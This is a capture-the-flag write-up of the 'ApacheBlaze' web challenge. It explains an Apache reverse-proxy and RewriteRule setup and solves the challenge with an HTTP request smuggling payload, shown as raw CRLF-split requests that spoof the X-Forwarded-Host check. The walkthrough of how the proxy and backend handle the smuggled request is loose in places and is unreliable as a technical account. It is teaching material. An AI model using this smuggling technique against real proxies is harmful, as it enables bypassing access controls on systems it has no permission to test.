---
description: Easy 🔮 Web
hidden: true
cover: https://i.pinimg.com/564x/19/cc/4d/19cc4d8e017b047cb4c1d02e5cc43524.jpg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ApacheBlaze

## Source code

<figure><img src="../../../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

The code checks if the user choose <mark style="color:red;">**`click_topia`**</mark> game and the request has <mark style="color:red;">**`X-Forwarded-Host`**</mark> header with value <mark style="color:red;">**`dev.apacheblaze.local`**</mark> it returns the flag as a JSON.

<figure><img src="../../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

The configuration described sets up a reverse proxy on port 1337, designed to forward incoming requests to a backend server operating on port 8080. This setup is enhanced by a load-balancing mechanism that intelligently distributes traffic between two backend servers, running on ports 8081 and 8082. Additionally, a rewrite rule within the first virtual host is responsible for specifically handling requests made to the <mark style="color:red;">**`/api/games/`**</mark> endpoint. These requests are seamlessly redirected to the backend server while dynamically adjusting the query parameters to ensure the correct data is processed.

#### Understanding the Reverse Proxy and Load Balancing Configuration

**Reverse Proxy with Apache (Port 1337 to 8080)**

In this configuration, Apache is set up to listen on port 1337, acting as an intermediary for client requests. When a client sends a request to this port, Apache forwards the request to a backend server on port 8080. This process is known as reverse proxying. Apache not only forwards the requests but also manages the communication between the client and the backend, ensuring that the response is appropriately routed back to the client.

**Load Balancing Across Multiple Backends (Ports 8081 and 8082)**

The configuration includes a load balancer within the second virtual host to enhance reliability and performance. This load balancer distributes incoming traffic across two backend servers running on ports 8081 and 8082. Load balancing is a crucial strategy in managing large volumes of traffic, as it prevents any single server from becoming overwhelmed by distributing the load evenly. This not only improves response times but also increases the system’s fault tolerance, as the failure of one server does not lead to system downtime.

**Custom Rewrite Rule for API Requests**

A critical aspect of this configuration is the rewrite rule defined in the first virtual host. This rule specifically intercepts requests made to the <mark style="color:red;">**`/api/games/`**</mark> endpoint. It modifies these requests by appending the appropriate query parameters before forwarding them to the backend server. This feature is particularly useful for ensuring that requests are properly formatted and directed, which can be essential for APIs that require specific parameters to function correctly.

#### The Role of mod\_proxy in Apache

The <mark style="color:red;">**`mod_proxy`**</mark> module is the backbone of this configuration. As an integral part of Apache, <mark style="color:red;">**`mod_proxy`**</mark> enables the server to function as a reverse proxy, which is essential for forwarding requests from the frontend to the backend. This module supports various protocols and can be configured to work with different types of backend servers, making it highly versatile. In addition to basic proxying, <mark style="color:red;">**`mod_proxy`**</mark> can also handle more complex tasks, such as load balancing, URL rewriting, and caching, which are all critical for modern web applications that demand high availability and performance.

In summary, this configuration not only sets up a reverse proxy to manage incoming requests but also incorporates advanced features like load balancing and custom URL rewriting to optimize the performance and reliability of the web application. By leveraging the capabilities of <mark style="color:red;">**`mod_proxy`**</mark>, Apache can effectively manage traffic, ensuring that backend servers are efficiently utilized and that client requests are handled smoothly and securely.

## Exploit ([HTTP Request Smuggling](#user-content-fn-1)[^1])

We can hide a second request with the <mark style="color:red;">**`\r\n`**</mark> splitting method. That enables us to send the request directly from the reverse proxy, so we will not have other stuff appended to the end of  [_<mark style="color:red;">**`X-Forwarded-Host`**</mark>_](#user-content-fn-2)[^2] header.

```
GET /api/games/click_topia HTTP/1.1
Host: dev.apacheblaze.local


GET / HTTP/1.1
Host: 94.237.53.20:53347
```

<figure><img src="../../../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

## Explain

When two HTTP requests are sent in a single connection and passed through a proxy, the process becomes more complex, especially in the context of HTTP Smuggling.

Assume the client sends the following requests:

```vbnet
GET /api/games/click_topia HTTP/1.1
Host: dev.apacheblaze.local

GET / HTTP/1.1
Host: 94.237.53.20:53347
```

#### 1. Proxy (Frontend) Processing the Requests

**Step 1: Receiving the Request**

* The proxy (Apache on port 1337) receives the entire HTTP request.

**Step 2: Applying the `RewriteRule`**

*   The proxy inspects the first request:

    ```vbnet
    GET /api/games/click_topia HTTP/1.1
    Host: dev.apacheblaze.local
    ```
*   The `RewriteRule` is applied as per your configuration:

    ```apache
    RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
    ```

    This rule transforms the first request into:

    ```vbnet
    GET /?game=click_topia HTTP/1.1
    Host: 127.0.0.1:8080
    ```

**Step 3: Handling the Second Request (Smuggled Request)**

* Typically, the proxy only processes the first request and forwards it to the backend. The remaining part of the data (the second request) might be ignored or not handled correctly by the frontend proxy.

#### 2. Backend Processing the Requests

When the proxy forwards the request to the backend:

**First Request:**

*   The backend (the server at **`127.0.0.1:8080`**) receives the transformed request:

    ```vbnet
    GET /?game=click_topia HTTP/1.1
    Host: 127.0.0.1:8080
    ```
* The backend processes this request and sends a response back to the front-end proxy.

**Second Request (Smuggled Request):**

* After processing the first request, the remaining data on the TCP connection (the second request) might be treated by the backend as a new HTTP request since it receives the entire payload from the proxy.
*   The second request that the backend receives might look like:

    ```vbnet
    GET / HTTP/1.1
    Host: 94.237.53.20:53347
    ```
* The backend will process this as a legitimate HTTP request and respond accordingly, possibly serving the homepage or another resource at <mark style="color:red;">**`/`**</mark>.

#### 3. Responses from the Backend:

* **Response to the First Request** (<mark style="color:red;">**`GET /?game=click_topia`**</mark>):
  * The backend sends this response back through the frontend proxy, which then forwards it to the original client.
* **Response to the Second Request** (<mark style="color:red;">**`GET / HTTP/1.1`**</mark>):
  * The backend might send a second response, which could be for the homepage <mark style="color:red;">**`/`**</mark> or another resource from the server at <mark style="color:red;">**`94.237.53.20:53347`**</mark>.
  * The frontend proxy might not recognize that this response corresponds to a smuggled request or might forward it without realizing that it stems from a hidden request.

[^1]: HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

[^2]: The **HTTP&#x20;**<mark style="color:red;">**`X-Forwarded-Host`**</mark> header is a request-type header de-facto standard header. This header is used to identify the original request made by the client. Because the hostnames and the ports differ in the reverse proxies that time this header took the leader and identify the original request. This header can also be used for debugging, creating location-based content. So this header kept the privacy of the client. The root version of this header is HTTP Forwarded.
